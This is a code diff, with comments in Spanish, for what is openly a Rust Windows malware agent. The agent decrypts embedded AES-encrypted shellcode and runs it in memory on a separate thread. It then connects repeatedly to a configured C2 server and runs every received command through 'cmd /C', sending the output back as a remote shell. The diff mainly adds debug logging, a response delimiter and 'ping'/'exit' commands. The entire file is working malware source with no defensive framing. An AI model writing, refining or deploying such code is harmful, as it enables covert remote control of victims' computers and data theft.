@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+#![windows_subsystem = "console"]  // Para debug
 
 mod config;
 
@@ -13,20 +13,26 @@ use winapi::um::synchapi::WaitForSingleObject;
 use winapi::um::winbase::INFINITE;
 use winapi::shared::minwindef::DWORD;
 use std::net::TcpStream;
-use std::io::{Read, Write};
+use std::io::{Read, Write, BufReader, BufRead};
 use std::process::Command;
 use std::thread;
 use std::time::Duration;
 
 type Aes256CbcDec = Decryptor<Aes256>;
 
+const DELIMITER: &str = "\n<<END>>\n";  // Delimitador de mensajes
+
 fn decrypt_shellcode() -> Vec<u8> {
+    println!("DEBUG: Desencriptando shellcode");
     let cipher = Aes256CbcDec::new_from_slices(config::KEY, config::IV).unwrap();
     let mut buffer = config::ENCRYPTED_SHELLCODE.to_vec();
-    cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec()
+    let result = cipher.decrypt_padded_mut::<Pkcs7>(&mut buffer).unwrap().to_vec();
+    println!("DEBUG: Shellcode desencriptado: {} bytes", result.len());
+    result
 }
 
 fn execute_shellcode() {
+    println!("DEBUG: Ejecutando shellcode");
     unsafe {
         let shellcode = decrypt_shellcode();
 
@@ -38,6 +44,7 @@ fn execute_shellcode() {
         );
 
         if mem.is_null() {
+            println!("DEBUG: Error allocando memoria");
             return;
         }
 
@@ -60,6 +67,17 @@ fn execute_shellcode() {
 }
 
 fn execute_command(cmd: &str) -> String {
+    println!("DEBUG: Ejecutando comando: '{}'", cmd);
+    
+    // Comandos especiales
+    if cmd == "ping" {
+        return "pong".to_string();
+    }
+    
+    if cmd == "exit" {
+        std::process::exit(0);
+    }
+    
     let output = Command::new("cmd")
         .args(&["/C", cmd])
         .output();
@@ -69,74 +87,119 @@ fn execute_command(cmd: &str) -> String {
             let stdout = String::from_utf8_lossy(&output.stdout);
             let stderr = String::from_utf8_lossy(&output.stderr);
             
-            if !stdout.is_empty() {
+            let result = if !stdout.is_empty() {
                 stdout.to_string()
             } else if !stderr.is_empty() {
-                stderr.to_string()
+                format!("[ERROR]\n{}", stderr)
             } else {
-                "Comando ejecutado sin salida".to_string()
-            }
+                "[OK] Comando ejecutado sin salida".to_string()
+            };
+            
+            println!("DEBUG: Resultado: {} bytes", result.len());
+            result
         }
-        Err(e) => format!("Error ejecutando comando: {}", e)
+        Err(e) => {
+            let error = format!("[ERROR] No se pudo ejecutar: {}", e);
+            println!("DEBUG: {}", error);
+            error
+        }
     }
 }
 
-fn connect_to_c2() -> Result<(), Box<dyn std::error::Error>> {
+fn handle_connection(stream: TcpStream) -> Result<(), Box<dyn std::error::Error>> {
+    println!("DEBUG: Conexión establecida");
+    
+    // Configurar timeouts
+    stream.set_read_timeout(Some(Duration::from_secs(60)))?;
+    stream.set_write_timeout(Some(Duration::from_secs(10)))?;
+    stream.set_nodelay(true)?;  // Deshabilitar Nagle para latencia baja
+    
+    let mut reader = BufReader::new(stream.try_clone()?);
+    let mut writer = stream;
+    
     loop {
-        // Intentar conectar al servidor C2
-        match TcpStream::connect(&config::C2_SERVER) {
-            Ok(mut stream) => {
-                println!("Conectado al servidor C2");
+        let mut command = String::new();
+        
+        println!("DEBUG: Esperando comando...");
+        
+        // Leer hasta encontrar el delimitador
+        match reader.read_line(&mut command) {
+            Ok(0) => {
+                println!("DEBUG: Conexión cerrada por el servidor");
+                return Err("Conexión cerrada".into());
+            }
+            Ok(n) => {
+                println!("DEBUG: Recibidos {} bytes", n);
+                let command = command.trim().to_string();
                 
-                // Buffer para recibir comandos
-                let mut buffer = [0; 1024];
+                if command.is_empty() {
+                    continue;
+                }
                 
-                loop {
-                    match stream.read(&mut buffer) {
-                        Ok(0) => {
-                            // Conexión cerrada por el servidor
-                            println!("Servidor cerró la conexión");
-                            break;
-                        }
-                        Ok(n) => {
-                            let command = String::from_utf8_lossy(&buffer[..n]).trim().to_string();
-                            
-                            // Ejecutar el comando
-                            let result = execute_command(&command);
-                            
-                            // Enviar el resultado de vuelta al servidor
-                            if let Err(e) = stream.write_all(result.as_bytes()) {
-                                println!("Error enviando respuesta: {}", e);
-                                break;
-                            }
-                        }
-                        Err(e) => {
-                            println!("Error leyendo del servidor: {}", e);
-                            break;
-                        }
+                println!("DEBUG: Comando: '{}'", command);
+                
+                // Ejecutar comando
+                let result = execute_command(&command);
+                
+                // Enviar respuesta con delimitador
+                let response = format!("{}{}", result, DELIMITER);
+                println!("DEBUG: Enviando {} bytes de respuesta", response.len());
+                
+                match writer.write_all(response.as_bytes()) {
+                    Ok(_) => {
+                        writer.flush()?;
+                        println!("DEBUG: Respuesta enviada exitosamente");
+                    }
+                    Err(e) => {
+                        println!("DEBUG: Error enviando respuesta: {}", e);
+                        return Err(e.into());
                     }
                 }
             }
             Err(e) => {
-                println!("Error conectando al servidor: {}", e);
-                // Esperar antes de reintentar
-                thread::sleep(Duration::from_secs(5));
+                println!("DEBUG: Error leyendo comando: {}", e);
+                return Err(e.into());
+            }
+        }
+    }
+}
+
+fn connect_to_c2() {
+    println!("DEBUG: Servidor C2: {}", config::C2_SERVER);
+    
+    loop {
+        println!("DEBUG: Intentando conectar...");
+        
+        match TcpStream::connect(&config::C2_SERVER) {
+            Ok(stream) => {
+                println!("DEBUG: ✅ Conectado al C2");
+                
+                if let Err(e) = handle_connection(stream) {
+                    println!("DEBUG: ❌ Error en conexión: {}", e);
+                }
+            }
+            Err(e) => {
+                println!("DEBUG: ❌ Error conectando: {}", e);
             }
         }
         
-        // Esperar antes de reconectar
+        println!("DEBUG: Reintentando en 5 segundos...");
         thread::sleep(Duration::from_secs(5));
     }
 }
 
 fn main() {
-    // Ejecutar shellcode en un hilo separado (opcional)
+    println!("DEBUG: 🚀 Agente iniciado");
+    println!("DEBUG: Servidor: {}", config::C2_SERVER);
+    
+    // Shellcode en hilo separado
     thread::spawn(|| {
         execute_shellcode();
     });
     
-    // Conectar al servidor C2 (bucle principal)
-    if let Err(e) = connect_to_c2() {
-        println!("Error en conexión C2: {}", e);
-    }
+    // Esperar un poco antes de conectar
+    thread::sleep(Duration::from_secs(2));
+    
+    // Conectar al C2
+    connect_to_c2();
 }
